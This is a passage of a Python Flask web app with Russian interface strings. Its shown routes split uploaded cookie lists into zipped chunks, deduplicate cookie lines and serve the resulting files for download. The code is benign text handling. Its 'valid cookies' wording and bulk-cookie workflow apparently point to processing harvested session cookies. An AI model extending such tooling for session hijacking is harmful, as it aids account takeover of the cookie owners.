        return jsonify({"success": False, "message": "Валидные куки не найдены"})
    
    chunks = [cookies[i:i + per_file] for i in range(0, len(cookies), per_file)]
    
    user_dir = os.path.join("downloads", session.get('user_id', 'default'))
    os.makedirs(user_dir, exist_ok=True)
    zip_filename = f"splitted_{int(time.time())}.zip"
    zip_filepath = os.path.join(user_dir, zip_filename)
    
    with zipfile.ZipFile(zip_filepath, 'w', zipfile.ZIP_DEFLATED) as zf:
        for idx, chunk in enumerate(chunks, 1):
            zf.writestr(f"cookies_part_{idx}.txt", '\n'.join(chunk))
    
    return jsonify({
        "success": True,
        "total_files": len(chunks),
        "download_url": f"/downloads/{session.get('user_id', 'default')}/{zip_filename}"
    })

@app.route("/api/clean-cookies", methods=["POST"])
def api_clean_cookies():
    data = request.json or {}
    processed = remove_duplicates(data.get("content", ""))
    
    user_dir = os.path.join("downloads", session.get('user_id', 'default'))
    os.makedirs(user_dir, exist_ok=True)
    filename = f"cleaned_{int(time.time())}.txt"
    filepath = os.path.join(user_dir, filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(processed)
    
    count = len([line for line in processed.split('\n') if line.strip()])
    return jsonify({"success": True, "count": count, "download_url": f"/downloads/{session.get('user_id', 'default')}/{filename}"})

@app.route("/downloads/<user_id>/<filename>")
def download_file(user_id, filename):
    if user_id != session.get('user_id', 'default'):
        return jsonify({"error": "Forbidden"}), 403
    return send_from_directory(os.path.join("downloads", user_id), filename, as_attachment=True)

# ==========================================
# ЗАПУСК
# ==========================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
